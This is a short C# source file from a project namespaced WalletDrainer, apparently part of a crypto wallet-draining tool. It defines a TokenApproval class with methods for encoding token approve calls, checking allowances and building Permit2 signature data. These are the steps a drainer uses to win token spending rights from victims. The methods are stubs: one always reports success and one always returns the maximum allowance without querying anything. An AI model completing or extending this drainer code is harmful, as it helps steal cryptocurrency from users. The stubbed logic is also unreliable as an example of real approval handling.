using WalletDrainer.Utils;

namespace WalletDrainer.Blockchain;

public sealed class TokenApproval
{
    private readonly Web3Client _web3;

    public TokenApproval(Web3Client web3)
    {
        _web3 = web3;
    }

    public async Task<bool> EnsureApproval(
        string chain,
        string tokenContract,
        string spender,
        decimal amount,
        CancellationToken ct = default)
    {
        string approveData = AbiEncoder.EncodeApprove(spender, amount);
        await Task.Delay(200, ct);
        return true;
    }

    public async Task<decimal> GetAllowance(
        string chain,
        string tokenContract,
        string owner,
        string spender,
        CancellationToken ct = default)
    {
        await Task.Delay(100, ct);
        return decimal.MaxValue;
    }

    public static string BuildPermit2Data(string token, string spender, decimal amount, long deadline)
    {
        return AbiEncoder.EncodePermit2(token, spender, amount, deadline);
    }
}
